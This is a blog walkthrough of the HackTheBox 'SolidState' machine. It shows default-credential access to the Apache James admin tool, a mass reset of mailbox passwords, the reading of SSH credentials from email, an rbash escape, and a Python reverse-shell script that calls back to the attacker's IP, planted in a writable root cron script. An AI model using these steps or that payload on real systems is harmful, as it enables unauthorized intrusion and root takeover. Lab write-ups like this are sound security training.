---
layout: page
title: SolidState
description: SolidState from HackTheBox.
img: 
importance: 3
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/cronos/logo.png" title="HTB SolidState Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/SolidState">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
SolidState seems like a pretty solid choice for the next box!

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.51 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 00:40 AEDT
Nmap scan report for 10.10.10.51
Host is up (0.026s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.12 [10.10.16.12])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   8.35 ms  10.10.16.1
2   18.32 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.42 seconds
```
{% endraw %}

<br />
Run nmap against all the ports to find any non-standard services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.51 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 00:41 AEDT
Nmap scan report for 10.10.10.51
Host is up (0.043s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
```
{% endraw %}

<br />
Run curl to see if there is any interesting information in the headers.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ curl -I http://10.10.10.13
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 10:41:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 01 Jan 2021 00:29:56 GMT
ETag: "2caf-5b7cbd6fbb19d"
Accept-Ranges: bytes
Content-Length: 11439
Vary: Accept-Encoding
Content-Type: text/html
```
{% endraw %}

<br />
Check the landing page that is being served on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/solidstate/landing.png" title="Port 80 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Looking up the James mail.  Apparently, it is maintained by Apache.  So, the service running on port 4555 is the administration panel.  I has the default credentials of root:root.  Let's use telnet to connect and test the creds.  Netcat kept freezing.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```
{% endraw %}

<br />
Type help to get a list of commands that we can run.

{% raw %}
```sh
HELP 
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```
{% endraw %}

<br />
Use the listusers to get a list of all the users on the mail system.

{% raw %}
```sh
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
{% endraw %}

<br />
Reset all of their passwords so we can break into all of their mail accounts.

{% raw %}
```sh
setpassword james letmein
Password for james reset
setpassword thomas letmein
Password for thomas reset
setpassword john letmein
Password for john reset
setpassword mindy letmein
Password for mindy reset
setpassword mailadmin letmein
Password for mailadmin reset
quit
Bye
```
{% endraw %}

<br />
The first mailbox we will check is the John mailbox.  It is asking to restrict Mindy's account and assign her a temp password.  Good to know.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS letmein
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```
{% endraw %}

<br />
Let's check Mindy's account next since it was mentioned in John's email.  Hey, a password!

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS letmein
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```
{% endraw %}

<br />
Check the other boxes if you feel the need.  None of them have anything interesting.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ telnet 10.10.10.51 110     
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS letmein
+OK Welcome james
LIST
+OK 0 0
.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```
{% endraw %}
{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER thomas
+OK
PASS letmein
+OK Welcome thomas
LIST
+OK 0 0
.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```
{% endraw %}
{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mailadmin
+OK
PASS letmein
+OK Welcome mailadmin
LIST
+OK 0 0
.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```
{% endraw %}

<br />
Use the creds from Mindy's email to ssh into the server.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ ssh mindy@10.10.10.51                          
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
```
{% endraw %}

<br />
Confirm the rbash shell.

{% raw %}
```sh
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```
{% endraw %}

<br />
Research different rbash escape methods.

<a href="https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e">https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e</a><br />
<a href="https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290">https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290</a><br />
<a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9</a>
<div class="row justify-content-sm-center">
    <div class="col-s-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/solidstate/escape.png" title="Escape Research" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the environment variables.

{% raw %}
```sh
mindy@solidstate:~$ export -p
declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1001/bus"
declare -x HOME="/home/mindy"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="mindy"
declare -x MAIL="/var/mail/mindy"
declare -x OLDPWD
declare -rx PATH="/home/mindy/bin"
declare -x PWD="/home/mindy"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="10.10.16.12 57662 22"
declare -x SSH_CONNECTION="10.10.16.12 57662 10.10.10.51 22"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="mindy"
declare -x XDG_RUNTIME_DIR="/run/user/1001"
declare -x XDG_SESSION_ID="17"
```
{% endraw %}

<br />
Try updating the PATH.

{% raw %}
```sh
mindy@solidstate:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-rbash: PATH: readonly variable
```
{% endraw %}

<br />
Check the bin folder to see what we can run.

{% raw %}
```sh
mindy@solidstate:~$ ls -la bin/
total 8
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 .
drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 ..
lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -> /bin/cat
lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /bin/env
lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls
```
{% endraw %}

<br />
Run compgen -c to get a list of commands that we can run.

{% raw %}
```sh
mindy@solidstate:~$ compgen -c
if
then
else
elif
fi
case
esac
for
select
while
until

<snip>
```
{% endraw %}

<br />
Logout of the ssh session and log back in using the -t option with no profile to try and stop the rbash from loading.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ ssh mindy@10.10.10.51 -t "bash --noprofile"
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
<redacted>
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:44:de brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:44de/64 scope global mngtmpaddr dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:44de/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run uname -a to get the Linux version.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ uname -a
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
```
{% endraw %}

<br />
Download linpeas.sh to the local working folder.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
--2025-02-15 01:41:46--  https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
Resolving github.com (github.com)... 140.82.112.3
Connecting to github.com (github.com)|140.82.112.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250214%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250214T144149Z&X-Amz-Expires=300&X-Amz-Signature=2a6471c22bfa85c72408dbd4f01a7d79a970a862af17c2775c00401bd3555157&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-02-15 01:41:47--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250214%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250214T144149Z&X-Amz-Expires=300&X-Amz-Signature=2a6471c22bfa85c72408dbd4f01a7d79a970a862af17c2775c00401bd3555157&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839912 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.23K  3.29MB/s    in 0.2s    

2025-02-15 01:41:48 (3.29 MB/s) - ‘linpeas.sh’ saved [839912/839912]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer linpeassh to the victim machine.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.16.12:8000/linpeas.sh
--2025-02-14 09:42:47--  http://10.10.16.12:8000/linpeas.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839912 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.23K  1.07MB/s    in 0.7s    

2025-02-14 09:42:48 (1.07 MB/s) - ‘linpeas.sh’ saved [839912/839912]

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x
chmod: missing operand after ‘+x’
Try 'chmod --help' for more information.
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x linpeas.sh
```
{% endraw %}

<br />
Give the peas a run.

{% raw %}
```sh
<snip>

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 May  3  2015 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27  2022 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.daily:
total 56
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27  2022 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 18  2017 apache2
-rwxr-xr-x   1 root root  1474 Jun  1  2017 apt-compat
-rwxr-xr-x   1 root root   355 Oct 25  2016 bsdmainutils
-rwxr-xr-x   1 root root   384 Dec 12  2012 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Feb 22  2017 dpkg
-rwxr-xr-x   1 root root    89 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1065 Dec 13  2016 man-db
-rwxr-xr-x   1 root root   249 May 17  2017 passwd
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27  2022 ..
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27  2022 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27  2022 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Dec 13  2016 man-db
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Apr 26  2021 .
drwxr-xr-x 7 root root 4096 Apr 26  2021 ..
-rw------- 1 root root    9 Feb 14 08:44 cron.daily
-rw------- 1 root root    9 Feb 14 08:54 cron.monthly
-rw------- 1 root root    9 Feb 14 08:49 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
NEXT                         LEFT       LAST                         PASSED      UNIT                         ACTIVATES                                                                                                                     
Fri 2025-02-14 10:00:17 EST  16min left Fri 2025-02-14 09:01:22 EST  42min ago   anacron.timer                anacron.service
Fri 2025-02-14 19:03:13 EST  9h left    Fri 2025-02-14 08:39:14 EST  1h 4min ago apt-daily.timer              apt-daily.service
Sat 2025-02-15 06:45:34 EST  21h left   Fri 2025-02-14 08:39:14 EST  1h 4min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2025-02-15 08:53:36 EST  23h left   Fri 2025-02-14 08:53:36 EST  50min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

<snip>
```
{% endraw %}

<br />
Curl localhost on port 631.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ curl 127.0.0.1:631
<!DOCTYPE HTML>
<html>
  <head>
    <link rel="stylesheet" href="/cups.css" type="text/css">
    <link rel="shortcut icon" href="/apple-touch-icon.png" type="image/png">
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <meta name="viewport" content="width=device-width">
```
{% endraw %}

<br />
Ok.  So, at this point, there is another exploit on exploit-db for the James server.  I ran it.  I am not going to include it in this write-up because it would only be useful if you couldn't break rbash.  But, here is the link if you want to give it a run yourself.

<a href="https://www.exploit-db.com/exploits/50347">https://www.exploit-db.com/exploits/50347</a>

<br />
Researching the installation of the James server indicates the the recommended installation location is opt.  So, let's run ls -la against the opt folder.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
    <meta name="viewport" content="width=device-width">
```
{% endraw %}

<br />
Well, that tmp.py looks mighty tempting being all writeable and everything.  So, on the attach machine, create a tmp.py file using <a href="https://revshells.com">revshells</a> as the base.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ cat tmp.py                  
import socket,subprocess,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.12",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Transfer the tmp.py to the victim machine.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.16.12:8000/tmp.py
wget 10.10.16.12:8000/tmp.py
--2025-02-15 19:38:54--  http://10.10.16.12:8000/tmp.py
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 204 [text/x-python]
Saving to: ‘tmp.py’

     0K                                                       100%  236K=0.001s

2025-02-15 19:38:54 (236 KB/s) - ‘tmp.py’ saved [204/204]
```
{% endraw %}

<br />
Copy the file to overwrite the /opt/tmp.py file.

{% raw %}
```sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cp tmp.py /opt/tmp.py
cp tmp.py /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
cat /opt/tmp.py
import socket,subprocess,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.12",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
{% endraw %}

<br />
Now, I didn't see the tmp.py in the cron jobs or timers of linpeas.  It only appeared in the interesting files sections.  So, I will go on investigating the James installation in the opt folder, maybe find a trigger or credentials in a conf file, who knows..  While exploritizing, I keep an eye on my listener.  Unitl one time...hey, a shell!  Neat.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/solidstate]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.51] 45954
root@solidstate:~#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
cat /root/root.txt
<redacted>
root@solidstate:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:d8:dd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d8dd/64 scope global mngtmpaddr dynamic 
       valid_lft 86393sec preferred_lft 14393sec
    inet6 fe80::250:56ff:feb9:d8dd/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
So, this is the final state of SolidState.  Hopefully, you enjoyed.